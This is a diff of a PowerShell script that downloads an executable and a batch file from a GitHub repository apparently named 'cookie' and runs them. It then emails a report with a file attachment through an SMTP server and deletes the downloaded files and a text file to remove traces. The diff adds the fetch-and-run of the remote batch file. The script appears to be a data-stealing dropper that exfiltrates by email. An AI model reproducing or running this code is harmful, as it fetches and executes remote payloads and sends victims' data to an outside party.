@@ -1,6 +1,6 @@
 (new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/demo.exe','D:\demo.exe');
-
-D:\demo.exe;
+(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/Command.txt','D:\Command.bat');
+D:\Command.bat;
 $SMTPServer = 'smtp.mailtrap.io'
 
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
@@ -25,5 +25,5 @@ $SMTPInfo.Send($ReportEmail)
 $ReportEmail.Attachments.Dispose()
 
 remove-item 'D:\a.txt'
-
+remove-item 'D:\Command.bat'
 remove-item 'D:\demo.exe'
